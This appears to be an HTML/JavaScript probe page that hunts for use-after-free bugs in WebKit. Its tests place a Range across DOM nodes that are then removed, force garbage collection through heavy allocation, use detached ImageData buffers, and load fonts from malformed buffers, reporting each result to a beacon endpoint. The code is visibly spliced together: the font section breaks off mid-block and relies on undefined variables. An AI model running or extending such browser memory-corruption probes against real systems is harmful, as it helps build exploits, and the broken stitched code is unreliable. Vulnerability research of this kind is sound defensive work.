  This probe targets OTHER WebKit objects with GC timing:

  A. Range spanning removed DOM nodes — classic WebKit UAF pattern

  E. createImageBitmap close + GC — bitmap backing store

<!-- A: Range spanning removed DOM nodes + GC                     -->
<!-- Classic WebKit UAF: Range holds refs to nodes that get freed  -->
<!-- ============================================================ -->

<script>
log('\n--- A: Range on removed DOM nodes ---');

window._aWRs = [];
window._aRange = null;

(function(){
  // Build a subtree
  var container = document.createElement('div');
  container.id = 'range-test';
  for(var i=0;i<10;i++){
    var span = document.createElement('span');
    span.textContent = 'Node-'+i+' ';
    span.id = 'rn'+i;
    container.appendChild(span);
  }
  document.body.appendChild(container);

  // Create a Range spanning nodes 2-7
  var range = document.createRange();
  range.setStart(container.childNodes[2], 0);
  range.setEnd(container.childNodes[7], 1); // end inside node 7's text

  log('A: Range created: "'+range.toString().slice(0,60)+'"');
  log('A: startContainer='+range.startContainer.nodeName+' endContainer='+range.endContainer.nodeName);

  window._aRange = range;

  // Now remove nodes 3-6 from the DOM (middle of range)
  for(var i=3;i<=6;i++){
    var node = document.getElementById('rn'+i);
    window._aWRs.push(new WeakRef(node));
    container.removeChild(node);
  }

  log('A: Removed nodes 3-6, checking Range...');

  // Range should collapse or adjust
  try {
    var afterRemove = range.toString();
    log('A: Range after remove: "'+afterRemove.slice(0,60)+'"');
    log('A: collapsed='+range.collapsed+' startOff='+range.startOffset+' endOff='+range.endOffset);
  } catch(e) {
    log('A: Range access error: '+e.message);
  }

  // Remove container too
  document.body.removeChild(container);
})();

// Heavy allocation to trigger GC
for(var i=0;i<500000;i++){var t={a:i};}
for(var i=0;i<100;i++){new ArrayBuffer(1048576);}
B('A-setup','range_created');
</script>

<!-- E: createImageBitmap close + GC                              -->
<!-- ImageBitmap has backing store that may dangle                -->
<!-- ============================================================ -->

<script>
log('\n--- E: ImageBitmap close + GC ---');

window._eWR = null;
window._eBitmapResult = 'pending';

// Check if createImageBitmap exists
if(typeof createImageBitmap === 'function'){
  log('E: createImageBitmap available');

  // Create a canvas with known content
  var c = document.createElement('canvas');
  c.width = 64; c.height = 64;
  var ctx = c.getContext('2d');
  ctx.fillStyle = '#FF0000';
  ctx.fillRect(0,0,64,64);
  ctx.fillStyle = '#00FF00';
  ctx.fillRect(16,16,32,32);

  // createImageBitmap is async — we'll check the result later via a global
  // But since it's a Promise, we can't get it synchronously.
  // Instead test close() behavior synchronously on what we can

  // Let's test: transfer ImageData to/from worker concept
  var imgData = ctx.getImageData(0,0,64,64);
  log('E: ImageData created: '+imgData.width+'x'+imgData.height+' ('+imgData.data.length+' bytes)');

  // Clone with transfer
  try {
    var cloned = structuredClone(imgData, {transfer: [imgData.data.buffer]});
    log('E: structuredClone transferred ImageData buffer');
    log('E: Original buffer detached? byteLength='+imgData.data.buffer.byteLength);
    log('E: Clone buffer: byteLength='+cloned.data.buffer.byteLength);

    // Try to read from original (detached)
    var origRead = 'CRASH';
    try {
      origRead = imgData.data[0]; // Should be undefined or throw
      origRead = 'val='+origRead;
    } catch(e) {
      origRead = 'THREW:'+e.message;
    }
    log('E: Read from original data[0]: '+origRead);

    // Try to use original ImageData in putImageData
    var putResult = 'CRASH';
    try {
      var c2 = document.createElement('canvas');
      c2.width = 64; c2.height = 64;
      var ctx2 = c2.getContext('2d');
      ctx2.putImageData(imgData, 0, 0);
      putResult = 'OK';
    } catch(e) {
      putResult = 'THREW:'+e.message;
    }
    log('E: putImageData with detached: '+putResult);

    window._eBitmapResult = 'transfer=ok|origBuf='+imgData.data.buffer.byteLength+'|read='+origRead+'|put='+putResult;
  } catch(e) {
    log('E: structuredClone transfer error: '+e.message);
    window._eBitmapResult = 'transfer_error:'+e.message;
  }
} else {
  log('E: createImageBitmap NOT available');
  window._eBitmapResult = 'no_createImageBitmap';
}

B('E-result', window._eBitmapResult);
</script>

<!-- Per spec, ArrayBuffer source → status=loaded immediately     -->

<script>
log('\n--- H: FontFace from ArrayBuffer ---');

window._hWR = null;
window._hFR = new FinalizationRegistry(function(v){window._hFRfired=true;});
window._hFRfired = false;

// Generate a minimal valid TrueType font
// This creates a font with a single glyph that's wider than most system fonts
function makeMinimalFont(){
  // Minimal OpenType/TrueType with tables: head, hhea, maxp, OS/2, name, cmap, post, glyf, loca
  // We'll try creating FontFace with different source types

  // Method 1: Try empty ArrayBuffer (should fail gracefully)
  var emptyResult = 'unknown';
  try {
    var f = new FontFace('EmptyFont', new ArrayBuffer(0));
    emptyResult = 'status='+f.status;
  } catch(e) {
    emptyResult = 'threw:'+e.message;
  }
  log('H: Empty ArrayBuffer: '+emptyResult);

  // Method 2: Try small buffer with TrueType magic
  var buf = new ArrayBuffer(64);
  var v = new DataView(buf);
  v.setUint32(0, 0x00010000); // sfVersion = TrueType
  v.setUint16(4, 0); // numTables = 0
  var smallResult = 'unknown';
  try {
    var f = new FontFace('SmallFont', buf);
    smallResult = 'status='+f.status;
  } catch(e) {
    smallResult = 'threw:'+e.message;
  }
  log('H: Minimal TT header: '+smallResult);

  // Method 3: Try larger buffer with more valid structure
  var buf2 = new ArrayBuffer(512);
  var v2 = new Uint8Array(buf2);
  // Copy WOFF2 magic: wOF2
  v2[0]=0x77; v2[1]=0x4F; v2[2]=0x46; v2[3]=0x32;
  var woffResult = 'unknown';
  try {
    var f = new FontFace('WoffFont', buf2);
    woffResult = 'status='+f.status;
  } catch(e) {
    woffResult = 'threw:'+e.message;
  }
  log('H: WOFF2 magic: '+woffResult);

  // Method 4: Fetch a real font synchronously from our server
  var fetchResult = 'unknown';
  try {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/beacon.php?tag=P1237-fontcheck&data=fetch', false);
    xhr.send();
    // We don't have a real font file, but let's see what we get
    fetchResult = 'xhr='+xhr.status;
  } catch(e) {
    fetchResult = 'xhr_error:'+e.message;
  }
  log('H: Fetch attempt: '+fetchResult);

  return {empty: emptyResult, small: smallResult, woff: woffResult, fetch: fetchResult};
}

var fontTests = makeMinimalFont();

// Method 5: Use local() source with load()
var localResult = 'unknown';
try {
  var face = new FontFace('LocalTest', 'local(serif)');
  localResult = 'created|status='+face.status;

  // Add to document.fonts
  document.fonts.add(face);
  localResult += '|added|size='+document.fonts.size;

  // Render with it

  div.style.cssText = 'font-family:"LocalTest",monospace;font-size:72px;white-space:nowrap;position:absolute;left:-9999px;';

} catch(e) {

if(window._hDiv){
  try {
    var w_gc = window._hDiv.offsetWidth;
    log('H: Width after GC = '+w_gc);

    // Force layout recalc
    window._hDiv.style.fontSize = '73px';
    var w_f = window._hDiv.offsetWidth;
    window._hDiv.style.fontSize = '72px';
    var w_r = window._hDiv.offsetWidth;
    log('H: Forced recalc: '+w_f+' → '+w_r);

    hGCResult = 'w='+w_gc+'|forced='+w_f+'|rest='+w_r;
    document.body.removeChild(window._hDiv);
  } catch(e) {
    hGCResult = 'THREW:'+e.message;
  }
}

B('H-result', 'alive='+hAlive+'|fr='+window._hFRfired+'|'+hGCResult);
</script>
